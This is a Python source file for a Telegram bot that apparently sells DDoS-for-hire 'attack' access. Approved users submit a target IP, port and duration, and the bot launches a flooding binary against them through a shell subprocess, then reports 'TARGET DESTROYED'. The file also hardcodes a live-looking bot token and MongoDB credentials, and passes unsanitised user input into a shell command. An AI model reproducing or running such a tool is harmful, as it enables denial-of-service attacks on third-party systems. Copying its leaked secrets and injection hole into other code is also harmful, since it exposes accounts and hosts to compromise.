import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from threading import Thread
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# Create an asyncio event loop
loop = asyncio.get_event_loop()

# Bot Configuration
TOKEN = '7942937704:AAFM6qI8dd74bEuSu-E0UUqN0N9FioD4qa8'
ADMIN_USER_ID = 7083378335  # Replace with actual admin user ID
MONGO_URI = 'mongodb+srv://sharp:sharp@sharpx.x82gx.mongodb.net/?retryWrites=true&w=majority&appName=SharpX'
USERNAME = "@TREXVIVEK"

# Attack Status Variable
attack_in_progress = False

# Logging Configuration
logging.basicConfig(format='%(asctime)s - ⚔️ %(message)s', level=logging.INFO)

# MongoDB Connection
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['sharp']
users_collection = db.users

# Initialize the bot
bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

# Blocked Ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]


async def start_asyncio_loop():
    """Background asyncio loop."""
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)


# Function to notify attack completion
def notify_attack_finished(target_ip, target_port, duration):
    bot.send_message(
        ADMIN_USER_ID,
        f"🔥 *MISSION COMPLETE!* 🔥\n\n"
        f"🎯 *TARGET DESTROYED:* `{target_ip}`\n"
        f"💣 *PORT PWNED:* `{target_port}`\n"
        f"⏳ *ATTACK DURATION:* `{duration} seconds`\n\n"
        f"💥 *Operation concluded successfully. Await further instructions.*",
        parse_mode='Markdown'
    )


# Asynchronous attack command execution
async def run_attack_command_async(target_ip, target_port, duration):
    global attack_in_progress
    attack_in_progress = True  # Set the flag to indicate an attack is in progress

    try:
        process = await asyncio.create_subprocess_shell(f"./sharp {target_ip} {target_port} {duration} 1000")
        await asyncio.sleep(180)  # Add 3-minute timer
        await process.communicate()
    except Exception as e:
        logging.error(f"Error during attack: {e}")
    finally:
        attack_in_progress = False  # Reset the flag after the attack is complete
        notify_attack_finished(target_ip, target_port, duration)


@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    cmd_parts = message.text.split()

    if user_id != ADMIN_USER_ID:
        bot.send_message(chat_id, f"🚫 *Access Denied. Only {USERNAME} has clearance for this operation.*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, f"📝 *Format: /approve <user_id> <plan> <days> or /disapprove <user_id>*", parse_mode='Markdown')
        return

    action, target_user_id = cmd_parts[0], int(cmd_parts[1])
    plan, days = (int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0), (int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0)

    if action == '/approve':
        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} approved – Plan {plan} activated for {days} days. Orders issued by {USERNAME}.*"
    else:
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} has been disapproved and removed from the access list.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')


@bot.message_handler(commands=['Attack'])
def attack_command(message):
    global attack_in_progress
    chat_id = message.chat.id

    if attack_in_progress:
        bot.send_message(chat_id, f"⚠️ *An attack is already underway. Stand by while the operation completes.*", parse_mode='Markdown')
        return

    try:
        bot.send_message(chat_id, f"📝 *Provide target IP, port, and duration in the following format: <IP> <Port> <Duration>.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Attack command error: {e}")


def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, f"⚠️ *Invalid input format. Use: /Attack <IP> <Port> <Duration>*", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"🚫 *Port {target_port} is restricted and cannot be used for this operation.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(
            message.chat.id,
            f"💀 *MISSION IN PROGRESS!*\n🎯 *Target IP:* `{target_ip}`\n🔒 *Port:* `{target_port}`\n⏳ *Duration:* `{duration} seconds`\n\n"
            f"*The operation is underway. Please stand by for updates.*",
            parse_mode='Markdown'
        )
    except Exception as e:
        logging.error(f"Error in process_attack_command: {e}")


@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    options = [
        KeyboardButton("💀 Initiate Attack 🔥"),
        KeyboardButton("🔍 Status Report"),
        KeyboardButton("📜 Mission Brief"),
        KeyboardButton("📞 Contact HQ"),
    ]
    markup.add(*options)

    bot.send_message(
        message.chat.id,
        f"👨‍💻 *Welcome to the Command Center, Agent {message.from_user.username}!*\n\n"
        f"🎯 *Your clearance level is currently being reviewed.*\n\n"
        f"💡 Use the command panel below to issue orders or request updates.",
        reply_markup=markup,
        parse_mode='Markdown'
    )


@bot.message_handler(func=lambda message: True)
def handle_message(message):
    try:
        if message.text == "💀 Initiate Attack 🔥":
            bot.send_message(
                message.chat.id,
                f"*Mission acknowledged. Deploying attack. Stay vigilant, {USERNAME} is monitoring.*",
                parse_mode='Markdown'
            )
            attack_command(message)
        elif message.text == "🔍 Status Report":
            user_data = users_collection.find_one({"user_id": message.from_user.id})
            response = (
                f"*🔐 Access Granted!*\n\n"
                f"📝 *Plan Details:*\n- **Plan ID:** {user_data['plan']}\n- **Valid Until:** {user_data['valid_until']}\n\n"
                f"Thank you for your service, Agent."
                if user_data
                else f"🚫 *Access Denied.* Your credentials are invalid."
            )
            bot.reply_to(message, response, parse_mode='Markdown')
        elif message.text == "📜 Mission Brief":
            bot.reply_to(
                message,
                f"*📋 Mission Brief:*\n\n"
                f"Use the commands to initiate operations or contact HQ.\nRemember to operate with discretion and precision.",
                parse_mode='Markdown'
            )
        elif message.text == "📞 Contact HQ":
            bot.reply_to(
                message,
                f"📞 *Headquarters Contact:* Reach out to {USERNAME} for direct support or inquiries.",
                parse_mode='Markdown'
            )
        else:
            bot.reply_to(message, f"❗*Unknown command. Managed by {USERNAME}.*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in handle_message: {e}")


if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_loop, daemon=True)
    asyncio_thread.start()

    logging.info("🚀 Bot is operational.")

    while True:
        try:
            bot.polling(none_stop=True, timeout=20, interval=1)
        except Exception as e:
            logging.error(f"Polling error: {e}")
            time.sleep(5)

            
